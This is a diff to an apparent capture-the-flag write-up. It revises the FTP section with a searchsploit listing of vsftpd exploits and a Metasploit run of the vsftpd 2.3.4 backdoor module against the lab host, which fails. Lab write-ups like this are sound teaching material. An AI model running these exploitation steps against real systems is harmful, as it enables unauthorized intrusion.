@@ -3,7 +3,6 @@
 
 ## Initial Recon
 The initial nmap scan of the box shows that there are three services for us to investigate - ftp, ssh and smb
-
 ```sh
 PORT    STATE SERVICE     VERSION
 21/tcp  open  ftp         vsftpd 2.3.4
@@ -40,8 +39,6 @@ Host script results:
 
 ## FTP
 The ftp service on this box has anonymous login enabled which allows us to connect without authenticating
-
-Unfortunately there are no files on the ftp server for us to look at.
 ```sh
 root@kali:~# ftp 10.10.10.3
 Connected to 10.10.10.3.
@@ -58,7 +55,49 @@ ftp> ls
 226 Directory send OK.
 ftp> 
 ```
-We can also find out whether the version of vsftpd running on the server is vulnerable
+Unfortunately there are no files on the ftp server for us to look at, we could try to see if there are any exploits for the version of vsftpd the service uses
+```sh
+root@kali:~# searchsploit vsftpd 2
+---------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                              |  Path
+                                                                            | (/usr/share/exploitdb/)
+---------------------------------------------------------------------------- ----------------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption              | exploits/linux/dos/5814.pl
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)              | exploits/windows/dos/31818.sh
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)              | exploits/windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of Service                                            | exploits/linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                      | exploits/unix/remote/17491.rb
+---------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+```
+We can try the [vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor) exploit and see if it works
+```sh
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   21               yes       The target port (TCP)
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+```
+In this case, it doesn't.
 
 ## SSH
 
